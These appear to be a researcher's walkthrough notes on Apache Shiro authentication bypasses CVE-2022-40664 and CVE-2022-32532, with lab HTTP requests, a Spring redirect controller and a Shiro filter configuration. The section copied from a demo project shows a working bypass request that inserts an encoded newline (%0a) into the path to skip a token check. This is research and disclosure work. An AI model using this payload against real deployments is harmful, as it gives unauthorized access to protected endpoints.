# CVE-2022-40664 research walkthrough

> Apache Shiro before 1.10.0, Authentication Bypass Vulnerability in Shiro when forwarding or including via RequestDispatcher.

https://media.githubusercontent.com/media/Bin4xin/bigger-than-bigger/master/assets/CVE-2022-40664/%E5%B1%8F%E5%B9%95%E5%BD%95%E5%88%B62022-10-25%2014.52.44.mov


## walkthrough

```http request
GET /admin/auth_pass HTTP/1.1
```

```http request
GET /admin/auth HTTP/1.1
```

```http request
GET /admin/auth HTTP/1.1
Token: 4ra1n
```

## exchange redirect from forward ?

```java
    @RequestMapping("/admin/{value}")
    public String CVE_2022_40664_bypass(@PathVariable String value, HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        System.out.println("=========== /admin" +((HttpServletRequest)request).getRequestURI()+ "/ ===========");
		//        request.getRequestDispatcher("/admin/auth").forward(request, response);
		//        return "forward:"+((HttpServletRequest)request).getRequestURI();
        response.sendRedirect("/admin/auth");
        return ("Redirect:/admin/auth");
    }
```

## shiro 1.10.0

```java
    @Bean
    public MyShiroFilterFactoryBean filterRegBean(SecurityManager securityManager) throws Exception {
        // CVE-2022-40664
        // fixed conf
        ShiroFilterConfiguration conf = new ShiroFilterConfiguration();
        conf.setFilterOncePerRequest(false);

        ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();
        shiroFilterFactoryBean.setSecurityManager(securityManager);
        shiroFilterFactoryBean.setShiroFilterConfiguration(conf);
        AbstractShiroFilter filter = shiroFilterFactoryBean.getObject();

        MyShiroFilterFactoryBean reg = new MyShiroFilterFactoryBean();
        reg.setFilter(filter);
        reg.addUrlPattern("/*");
        reg.setName("shiroFilter");
        reg.setSecurityManager(securityManager);
        reg.setDispatcherTypes(EnumSet.allOf(DispatcherType.class));
        //fixed conf end.
        return reg;
```

Do not work.

## reference

- [^1] [Lay0us1/CVE-2022-32532](https://github.com/Lay0us1/CVE-2022-32532){:target="_blank"}
- [^2] [defining a bean named 'shiroFilterFactoryBean'](https://blog.csdn.net/hanzl1/article/details/104228376){:target="_blank"}
- [^3] [CVE-2022-40664](https://juejin.cn/post/7154702383720136718#heading-0){:target="_blank"}
- [^4] [Shiro 1.7和1.10对于forward请求的处理](https://blog.csdn.net/xyjy11/article/details/127324055){:target="_blank"}
- [^5] [SpringBoot整合shiro-spring-boot-web-starter](https://blog.csdn.net/liu320yj/article/details/109090797){:target="_blank"}
- [^6] [[ANNOUNCE][CVE-2022-32532] Apache Shiro 1.9.1 released](https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh){:target="_blank"}

# [Lay0us1/CVE-2022-32532](https://github.com/Lay0us1/CVE-2022-32532)

## about

This is a demo project, which only shows one of the conditions for exploiting this vulnerability (CVE-2022-32532). 

In fact, there are more ways to exploit it, as long as developers use `RegExPatternMatcher`, there will be a possible bypass vulnerability.

## introduce

Token request header verification is required under the current configuration, otherwise you do not have permission to access the interface under `/permit`

This request can succeed
```http request
GET /permit/any HTTP/1.1
Token: 4ra1n
```

Access is not allowed when there is no token request header
```http request
GET /permit/any HTTP/1.1
```

It can be bypassed in a simple way in special but common configurations
```http request
GET /permit/a%0any HTTP/1.1
```

## reference

https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh

This vulnerability is similar to Spring-Security [CVE-2022-22978](https://tanzu.vmware.com/security/cve-2022-22978)

Thanks to [bdemers](https://github.com/bdemers) (Apache Shiro PMC) and [chybeta](https://github.com/chybeta) (Security Researcher)